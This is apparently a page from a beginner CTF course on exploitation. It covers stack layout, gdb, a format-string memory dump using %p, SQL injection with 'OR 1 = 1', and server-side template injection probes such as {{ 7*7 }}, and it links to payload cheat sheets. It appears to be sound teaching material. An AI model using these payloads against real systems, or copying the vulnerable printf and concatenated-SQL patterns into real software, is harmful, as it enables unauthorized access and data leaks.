+<p>There's a way to exploit this program and get the flag without knowing the passcode at all. Work with a teammate to brainstorm how you might do so.</p>
+<p>In an x86 compatible VM (or emulator), attempt to run the program and try your solution.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="the-stack"><a class="header" href="#the-stack">The Stack</a></h1>
+<p>With a colleague, sketch out how the following items would be arranged on the stack.</p>
+<p>Assume the following:</p>
+<ul>
+<li>We are dealing with a 32-bit, little endian processor.</li>
+<li>int's are four bytes each</li>
+</ul>
+<p>Code:</p>
+<pre><code class="language-C">int w = 1;
+int x = 2;
+int y = 3;
+int z = 4;
+int int_array[4] = {5,6,7,8};
+</code></pre>
+<hr />
+<p>You can check your answer by looking at the following output from gcc on the above code.</p>
+<pre><code>        mov     DWORD PTR [rbp-4], 1
+        mov     DWORD PTR [rbp-8], 2
+        mov     DWORD PTR [rbp-12], 3
+        mov     DWORD PTR [rbp-16], 4
+        mov     DWORD PTR [rbp-32], 5
+        mov     DWORD PTR [rbp-28], 6
+        mov     DWORD PTR [rbp-24], 7
+        mov     DWORD PTR [rbp-20], 8
+</code></pre>
+<p>Finally, if I executed the command, <code>int_array[4] = 9;</code>, which values change?</p>
+<hr />
+<p>Answer:</p>
+<p>Take a look at this output:</p>
+<pre><code>int_array[0] located at 0xffccb9b0
+int_array[1] located at 0xffccb9b4
+int_array[2] located at 0xffccb9b8
+int_array[3] located at 0xffccb9bc
+int_array[4] located at 0xffccb9c0
+z located at 0xffccb9c0
+</code></pre>
+<p>Which is generated by running:</p>
+<pre><code class="language-C">printf("int_array[0] located at %p\n", &amp;int_array[0]);
+printf("int_array[1] located at %p\n", &amp;int_array[1]);
+printf("int_array[2] located at %p\n", &amp;int_array[2]);
+printf("int_array[3] located at %p\n", &amp;int_array[3]);
+printf("int_array[4] located at %p\n", &amp;int_array[4]);
+printf("z located at %p\n", &amp;z);
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="quick-disassembly"><a class="header" href="#quick-disassembly">Quick Disassembly</a></h1>
+<p>Need an address of a function? Open the binary in gdb using:</p>
+<pre><code>gdb ./vuln
+</code></pre>
+<p>To find the section of interest use the disas command:</p>
+<pre><code>disas main
+</code></pre>
+<p><img src="binaryexploit/disas.png" alt="gdb output" /></p>
+<p>Note the address of the function at the top. Here we see main() starting at 0x08049372.</p>
+<p>To quit gdb, simply <code>quit</code>.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="format-string-vulnerability"><a class="header" href="#format-string-vulnerability">Format String Vulnerability</a></h1>
+<p>Take a look at the following code:</p>
+<pre><code class="language-C">int main(int argc, char *argv[]) {
+
+    printf("Welcome to %s\n", argv[0]);
+    printf("You called the program with %d options. They are:\n", argc-1);
+
+    if (argc &gt; 1) {
+        int j;
+        for (j=1; j &lt; argc; j++) {
+        printf(argv[j]);
+        printf("\n");
+        }
+    }
+    return 0;
+}
+</code></pre>
+<p>What would happen if we ran this command line program with an option like <code>hello world</code>?</p>
+<pre><code>./formatstring hello world
+
+Welcome to ./formatstring
+You called the program with 2 options. They are:
+hello
+world
+</code></pre>
+<p>Works as intended!</p>
+<p>But the dangerous bit (which is noted by the compiler by the way...) is the so-called naked format string in the following line:</p>
+<pre><code class="language-C">printf(argv[j]);
+</code></pre>
+<p>This can be abused by sending printf format options, the most common of which are <code>%p</code> or <code>%x</code>.</p>
+<p>Let's try spamming it with %p to dump memory:</p>
+<pre><code>./formatstring %p%p%p%p%p%p%p%p%p
+
+Welcome to ./formatstring
+You called the program with 1 options. They are:
+0x10x10239d9100x16da6f7200x20x16da6f7000x19f403f280x00x00x0
+</code></pre>
+<p>And just like that we start dumping memory!</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="injections"><a class="header" href="#injections">Injections</a></h1>
+<p>User input is always dangerous! Malicious actors will attempt to find and exploit any possible vulnerabilities your code.</p>
+<p>In this course we will look at two different types of user inputs that lead to undesired program execution:</p>
+<ul>
+<li>Abusing unsanitized SQL statements to leak information or bypass authentication.</li>
+<li>Causing remote code execution in websites that rely on templates to generate content.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h1>
+<p>Many systems rely on databases as their backend. Take for instance an online store that sells items through a website. The website relies on databases to store not only pricing information, inventory status, and shipping info, but also user account information such as addresses, usernames, and passwords. The standard language used to communicate with many relational databases is known as Structured Query Language, aka SQL.</p>
+<p>The problem comes when the SQL query is based on elements of user input. The designers may have intended the user to provide details crucial to an inventory search, but threat actors have included portions of a SQL query itself to steer execution in their desired direction.</p>
+<p>The classic example is evaluating username and password by simply pulling them from a database. A query might look like</p>
+<pre><code class="language-SQL">SELECT * FROM user_db WHERE username = fred AND password = rightsaidfred
+</code></pre>
+<p>A developer could build this query in a naive way by reading in a string from the user and storing it in variables, say <code>userid_input</code> and <code>password_input</code>.</p>
+<p>Then</p>
+<pre><code>sql_string = "SELECT * FROM user_db WHERE username =  " + userid_input + " AND password = " + password_input;
+</code></pre>
+<p>The string above would allow malicious users to inject SQL commands of their own. For example, if the user knew a username and then entered <code>something OR 1 = 1</code> for the password, the query would then be:</p>
+<pre><code>sql_string = "SELECT * FROM user_db WHERE username = fred AND password = something OR 1 = 1";
+</code></pre>
+<p>where the OR statement is paired with something that is always true. We know that the password <code>something</code> is incorrect, but the addition of the <code>OR 1 = 1</code> would cause this portion of the statement to always evaluate TRUE, thereby bypassing the password check entirely!!!</p>
+<hr />
+<p>Most CTF players will develop cheat sheets on common SQL injections, especially since there can be subtle differences in how different database vendors handle queries.</p>
+<p><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/">Example SQL Injection cheat sheet.</a></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="server-side-template-injection"><a class="header" href="#server-side-template-injection">Server Side Template Injection</a></h1>
+<p>Frameworks like Flask and Django (Python), Liquid (Ruby), Handlebars (NodeJS), etc. are ways of extending traditional programming languages into interactive web applications.</p>
+<p>Vulnerabilities can occur when user input is not sanitized. These are especially dangerous because they allow remote code execution (RCE).</p>
+<hr />
+<p>Example:</p>
+<p>Flask (a Python web framework) uses double curly braces <code>{{}}</code> to mix Python code into an HTML page. A malicious user could post <code>{{ 7*7 }}</code> to see if the answer 49 appears anywhere in the resulting webpage, illustrating that RCE is possible.</p>
+<p>Here's an example login page:
+<img src="injections/.//flask1.png" alt="Login page" /></p>
+<p>A malicious user, knowing the framework, could attempt an exploit:</p>
+<p><img src="injections/.//flask2.png" alt="Login page with SSTI" /></p>
+<hr />
+<ol>
+<li>
+<p>Initial Recon:</p>
+<p>Determine which framework (Handlebars, Flask, etc.) is being used. One possibility is to send all the most common framework escape characters to see if any trigger a response. An example of this would be:</p>
+<p><code>${{&lt;%[%'"}}%\.</code></p>
+</li>
+<li>
+<p>After elucidating which web framework, consult an <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">SSTI cheat sheet like this</a> or use an automated tool like <a href="https://github.com/epinna/tplmap/blob/master/burp_extension/README.md">this plugin</a> for Burp Suite.</p>
+</li>
+</ol>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+        <script>
+        window.addEventListener('load', function() {
+            MathJax.Hub.Register.StartupHook('End', function() {
+                window.setTimeout(window.print, 100);
+            });
+        });
+        </script>
+
+
+    </div>
+    </body>
+</html>
